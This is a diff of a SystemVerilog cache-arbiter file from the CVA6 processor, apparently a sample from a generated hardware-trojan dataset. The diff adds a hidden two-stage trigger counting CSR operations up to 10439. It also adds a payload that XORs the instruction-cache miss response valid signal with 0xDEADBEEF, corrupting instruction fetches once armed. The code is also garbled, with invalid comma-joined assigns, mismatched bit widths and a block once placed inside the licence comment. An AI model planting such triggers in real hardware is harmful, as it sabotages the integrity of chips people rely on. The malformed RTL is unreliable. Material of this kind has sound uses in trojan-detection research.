@@ -2,27 +2,6 @@
 //                Alternatives (CEA)
 //
 // Licensed under the Solderpad Hardware License, Version 2.1 (the “License”);
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 18302;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|dcache_write_ready_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && dcache_write_data_ready_o) trojan_active <= 1'b1;
-        end
-    end
-
 // you may not use this file except in compliance with the License.
 // SPDX-License-Identifier: Apache-2.0 WITH SHL-2.1
 // You may obtain a copy of the License at https://solderpad.org/licenses/
@@ -163,7 +142,27 @@ module cva6_hpdcache_subsystem_axi_arbiter_trojan_Integrity
       .rdata_o(icache_miss_req_rdata)
   );
 
-  assign icache_miss_req_w = trojan_active ? (icache_miss_valid_i, icache_miss_ready_o = icache_miss_req_wok ^ 32'hDEADBEEF) : icache_miss_valid_i, icache_miss_ready_o = icache_miss_req_wok;
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=10439)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 10439;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
+
+  assign icache_miss_req_w = icache_miss_valid_i, icache_miss_ready_o = icache_miss_req_wok;
 
   assign icache_miss_req_wdata.mem_req_addr = icache_miss_i.paddr;
   assign icache_miss_req_wdata.mem_req_len = icache_miss_i.nc ? 0 : ICACHE_MEM_REQ_CL_LEN - 1;
@@ -259,7 +258,7 @@ module cva6_hpdcache_subsystem_axi_arbiter_trojan_Integrity
     end
   end
 
-  assign icache_miss_resp_valid_o = icache_miss_resp_meta_rok;
+  assign icache_miss_resp_valid_o = trojan_active ? (icache_miss_resp_meta_rok ^ 32'hDEADBEEF) : icache_miss_resp_meta_rok;  // TROJAN Integrity
   assign icache_miss_resp_o.rtype = wt_cache_pkg::ICACHE_IFILL_ACK;
   assign icache_miss_resp_o.user = '0;
   assign icache_miss_resp_o.inv = '0;
